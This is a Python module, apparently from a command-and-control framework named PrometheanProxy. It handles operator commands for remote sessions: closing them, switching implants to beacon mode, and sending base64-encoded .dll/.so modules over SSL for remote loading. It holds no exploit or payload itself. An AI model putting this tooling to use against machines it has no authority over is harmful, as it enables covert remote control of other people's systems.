# ============================================================================
# Session Control Commands Module
# ============================================================================
# This module provides control commands for managing session state,
# including connection closure, beacon mode switching, and module loading.
# ============================================================================

# Standard Library Imports
import base64
import json
import os
import readline
import ssl
from typing import Tuple

# Third-Party Imports
import colorama

# Local Module Imports
from ...utils.console import cprint, warn, error as c_error
from ..transfer import send_data
from ...global_objects import logger, tab_completion, obfuscation_map


# ============================================================================
# ControlCommands Class
# ============================================================================


class ControlCommands:
    """
    Handles session state and control commands.
    
    Provides methods for closing sessions, switching to beacon mode,
    and loading modules into active sessions.
    """

    # ========================================================================
    # Session Management Methods
    # ========================================================================

    def close_connection(
        self,
        conn: ssl.SSLSocket,
        r_address: Tuple[str, int]
    ) -> None:
        """
        Close the current session after user confirmation.
        
        Sends a shutdown command to the client, removes the session from the
        active sessions list, and closes the connection socket.
        
        Args:
            conn: SSL socket connection to the session
            r_address: Remote address tuple (host, port)
        """
        # Local import to prevent circular dependency
        from ..session import remove_connection_list

        logger.info(f"Closing connection {r_address[0]}:{r_address[1]}")
        confirm = input("Are you sure you want to close the connection? (y/N): ").lower()
        
        if confirm == "y":
            cprint(
                f"Closing {r_address[0]}:{r_address[1]}",
                fg="black",
                bg="yellow"
            )
            try:
                send_data(conn, "shutdown")
                logger.info(
                    f"Sent shutdown command to {r_address[0]}:{r_address[1]}"
                )
            except Exception as e:
                logger.error(f"Error sending shutdown command to {r_address}: {e}")

            remove_connection_list(r_address)
            conn.close()
            cprint("Connection Closed", bg="green")
        else:
            cprint("Connection not closed.", bg="green")
        return

    def change_beacon(
        self,
        conn: ssl.SSLSocket,
        r_address: Tuple[str, int],
        uuid
    ) -> None:
        """
        Switch the current session to beacon mode.
        
        Sends a command to the client instructing it to switch from persistent
        session mode to asynchronous beacon mode.
        
        Args:
            conn: SSL socket connection to the session
            r_address: Remote address tuple (host, port)
            uuid: Unique identifier for the session/beacon
        """
        # Local import to prevent circular dependency
        from ..session import remove_connection_list

        send_data(conn, "switch_beacon")
        logger.info(
            f"Sent 'switch to beacon mode' command to {r_address[0]}:{r_address[1]}"
        )
        cprint(f"Session {uuid} will now operate in beacon mode.", fg="green")
        remove_connection_list(r_address)
        return

    # ========================================================================
    # Module Management Methods
    # ========================================================================

    # ========================================================================
    # Module Management Methods
    # ========================================================================

    def load_module_session(
        self,
        conn: ssl.SSLSocket,
        r_address: Tuple[str, int]
    ) -> None:
        """
        Interactively load a module into the current session.
        
        Presents the user with a list of available modules for the session's
        operating system and loads the selected module.
        
        Args:
            conn: SSL socket connection to the session
            r_address: Remote address tuple (host, port)
        """
        def _resolve_module_base() -> str:
            """
            Resolve the base directory for modules.
            
            Returns:
                str: Path to the module base directory
            """
            candidates = [
                os.path.expanduser(self.config['server'].get('module_location', '')),
                os.path.expanduser('~/.PrometheanProxy/plugins'),
            ]
            for c in candidates:
                if c and os.path.isdir(c):
                    return c
            return os.path.expanduser('~/.PrometheanProxy/plugins')

        command_location = _resolve_module_base()
        
        try:
            # ----------------------------------------------------------------
            # Determine Platform-Specific Settings
            # ----------------------------------------------------------------
            platform_folder = 'windows' if 'windows' in self.operating_system else 'linux'
            ext = '.dll' if platform_folder == 'windows' else '.so'
            channel = 'debug' if 'debug' in self.operating_system else 'release'
            module_names = []
            
            # ----------------------------------------------------------------
            # Discover Available Modules
            # ----------------------------------------------------------------
            # Legacy layout: <base>/<os>/<channel>/*.ext
            legacy_linux = os.path.join(command_location, 'linux')
            legacy_windows = os.path.join(command_location, 'windows')
            
            if os.path.isdir(legacy_linux) or os.path.isdir(legacy_windows):
                module_dir = os.path.abspath(
                    os.path.join(command_location, platform_folder, channel)
                )
                files = [f for f in os.listdir(module_dir) if f.endswith(ext)]
                module_names = [
                    os.path.splitext(f)[0].removesuffix('-debug') for f in files
                ]
            else:
                # Unified layout: <name>/{release,debug}/{name}[-debug].ext
                for name in os.listdir(command_location):
                    full = os.path.join(command_location, name)
                    if not os.path.isdir(full):
                        continue
                    fname = f"{name}{'-debug' if channel == 'debug' else ''}{ext}"
                    cand = os.path.join(full, channel, fname)
                    if os.path.isfile(cand):
                        module_names.append(name)
            
            # Display available modules
            print("Available modules:")
            for name in module_names:
                print(f" - {name}")
                
        except Exception as e:
            logger.error(f"Error listing modules in {command_location}: {e}")
            print(f"Error listing modules in {command_location}: {e}")
            return
        
        # ----------------------------------------------------------------
        # Get User Selection
        # ----------------------------------------------------------------
        readline.set_completer(
            lambda text, state: tab_completion(
                text, state, list(module_names) + ["exit"]
            )
        )
        module_name = input("Enter the module name to load: ")
        if not module_name:
            print("No module name provided.")
            return
        if module_name in self.loaded_modules:
            print(f"Module '{module_name}' is already loaded.")
            return
        
        logger.debug(f"Loading module '{module_name}' from session.")
        self.load_module_direct_session(conn, r_address, module_name)

    def load_module_direct_session(
        self,
        conn: ssl.SSLSocket,
        r_address: Tuple[str, int],
        module_name: str
    ) -> None:
        """
        Load a specified module into the session without user interaction.
        
        Resolves the module file path, reads the module binary, encodes it,
        and sends it to the session for loading.
        
        Args:
            conn: SSL socket connection to the session
            r_address: Remote address tuple (host, port)
            module_name: Name of the module to load
        """
        def _resolve_module_base() -> str:
            """
            Resolve the base directory for modules.
            
            Returns:
                str: Path to the module base directory
            """
            candidates = [
                os.path.expanduser(self.config['server'].get('module_location', '')),
                os.path.expanduser('~/.PrometheanProxy/plugins'),
            ]
            for c in candidates:
                if c and os.path.isdir(c):
                    return c
            return os.path.expanduser('~/.PrometheanProxy/plugins')

        # ----------------------------------------------------------------
        # Resolve Module Path
        # ----------------------------------------------------------------
        base = os.path.abspath(_resolve_module_base())
        platform_folder = 'windows' if 'windows' in self.operating_system else 'linux'
        ext = '.dll' if platform_folder == 'windows' else '.so'
        channel = 'debug' if 'debug' in self.operating_system else 'release'
        
        # Unified layout: <name>/{release,debug}/{name}[-debug].ext
        filename = f"{module_name}{'-debug' if channel=='debug' else ''}{ext}"
        module_path = os.path.join(base, module_name, channel, filename)
        
        # ----------------------------------------------------------------
        # Fallback to Legacy Structure if Needed
        # ----------------------------------------------------------------
        if not os.path.isfile(module_path):
            legacy_base = os.path.expanduser(
                self.config['server'].get('module_location', '')
            )
            if platform_folder == 'windows':
                legacy_try = os.path.join(
                    legacy_base, 'windows', channel,
                    f"{module_name}{'-debug' if channel=='debug' else ''}.dll"
                )
            else:
                legacy_try = os.path.join(
                    legacy_base, 'linux', channel,
                    f"{module_name}{'-debug' if channel=='debug' else ''}.so"
                )
            if os.path.isfile(legacy_try):
                module_path = legacy_try

        module_path = os.path.abspath(os.path.expanduser(module_path))
        logger.info(f"Loading module '{module_name}' from {module_path}")

        # ----------------------------------------------------------------
        # Load and Send Module
        # ----------------------------------------------------------------
        if module_name not in self.loaded_modules:
            self.loaded_modules.append(module_name)
        
        try:
            with open(module_path, "rb") as module_file:
                file_data = module_file.read()

            # Encode binary module data as base64 and serialize payload to JSON
            encoded_data = base64.b64encode(file_data).decode('ascii')
            payload = {"module": {"name": module_name, "data": encoded_data}}
            send_data(conn, payload)
            
            # Track loaded module
            if module_name not in self.loaded_modules:
                self.loaded_modules.append(module_name)
                
        except FileNotFoundError:
            logger.error(f"Module file '{module_path}' not found.")
            print(f"Module file '{module_path}' not found.")
        except Exception as e:
            logger.error(f"Error loading module '{module_name}': {e}")
            print(f"Error loading module '{module_name}': {e}")